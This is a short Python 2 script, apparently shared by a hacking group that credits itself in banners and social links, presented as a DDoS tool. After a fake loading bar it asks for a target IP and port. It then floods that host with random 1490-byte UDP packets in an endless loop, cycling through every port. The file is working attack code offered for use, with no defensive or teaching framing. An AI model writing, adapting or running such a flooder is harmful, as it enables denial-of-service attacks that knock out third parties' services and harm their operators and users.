import sys
import os
import time
import socket
import random

K = '\033[93m'
U = '\033[95m'
C = '\033[94m'
R = '\033[91m'
H = '\033[92m'
N = '\x1b[0m'    # WARNA MATI

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############


"""
print('''\033[92m
                                                                       
DDDDDDDDDDDDD      DDDDDDDDDDDDD                                          
D::::::::::::DDD   D::::::::::::DDD                                       
D:::::::::::::::DD D:::::::::::::::DD                                     
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D                                    
  D:::::D    D:::::D D:::::D    D:::::D    ooooooooooo       ssssssssss   
  D:::::D     D:::::DD:::::D     D:::::D oo:::::::::::oo   ss::::::::::s  
  D:::::D     D:::::DD:::::D     D:::::Do:::::::::::::::oss:::::::::::::s 
  D:::::D     D:::::DD:::::D     D:::::Do:::::ooooo:::::os::::::ssss:::::s
  D:::::D     D:::::DD:::::D     D:::::Do::::o     o::::o s:::::s  ssssss 
  D:::::D     D:::::DD:::::D     D:::::Do::::o     o::::o   s::::::s      
  D:::::D     D:::::DD:::::D     D:::::Do::::o     o::::o      s::::::s   
  D:::::D    D:::::D D:::::D    D:::::D o::::o     o::::ossssss   s:::::s 
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  o:::::ooooo:::::os:::::ssss::::::s
D:::::::::::::::DD D:::::::::::::::DD   o:::::::::::::::os::::::::::::::s 
D::::::::::::DDD   D::::::::::::DDD      oo:::::::::::oo  s:::::::::::ss  
DDDDDDDDDDDDD      DDDDDDDDDDDDD           ooooooooooo     sssssssssss     Version:2.0  
                                                                          
\033[93m  
        \033[95m
		
+-----------------------------+
|    THIS TOOL IS PRIVATE     |
+-----------------------------+
| Coded By : Mr.Noname        |
+-----------------------------+
| Team : Panoc.Team           |
+-----------------------------+
"""



os.system("clear")
os.system("figlet PanocTeam DDoS")
print
print (U+"                                                     version:4.0")
print (K+"===========================================================")
print (R+"[+] Coded By       : V.Tersenyumlah                        #")
print (R+"[+] Edited By      : Mr.Noname                             #")
print (K+"___________________________________________________________#")
print (H+"[+] Blog           : https://panocteam.blogspot.com        #")
print (H+"[+] Github         : https://github.com/PanocTeam25        #")
print (H+"[+] TEAM           : Pancasila anonim cyber                #")
print (H+"[+] Thanks         : All Member Panoc                      #")
print (H+"[+] Instagram      : Panoc.Team                            #")
print (K+"===========================================================")
print (R+"                                   Subscribe Youtube PANOC TEAM")
print (K+"###########################")
print (R+"USER : %sPREMIUM%s"%  (H,N))
print (K+"###########################")
print
ip = raw_input(R+"Ip Target %s[example: 122.432.111.42] :%s"% (H,N) )
port = input(H+"Port      : ")

os.system("clear")
os.system("figlet Meload Paket")
print " [|||||] 10%"
time.sleep(1)
print " [||||||||||] 20%"
time.sleep(1)
print " [|||||||||||||||] 30%"
time.sleep(1)
print " [||||||||||||||||||||] 40%"
time.sleep(1)
print " [|||||||||||||||||||||||||] 50%"
time.sleep(1)
print " [||||||||||||||||||||||||||||||] 60%"
time.sleep(1)
print " [|||||||||||||||||||||||||||||||||||] 70%"
time.sleep(1)
print " [||||||||||||||||||||||||||||||||||||||||] 80%"
time.sleep(1)
print " [|||||||||||||||||||||||||||||||||||||||||||||] 90%"
time.sleep(1)
print " [||||||||||||||||||||||||||||||||||||||||||||||||||] 100%"
time.sleep(5)
os.system("clear")
print " HARAP TUNGGU..."
time.sleep (5)
print " INSTALL PACKET..."
time.sleep(5)
print " INSTALL PORT..."
time.sleep(5)
print " ..................."
time.sleep(5)
print (R+" Connect To Server...")
time.sleep(16)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print (R+"Sent %s packet Port %s      To      <-- %s -->"%(sent,port,ip))
     if port == 65534:
       port = 1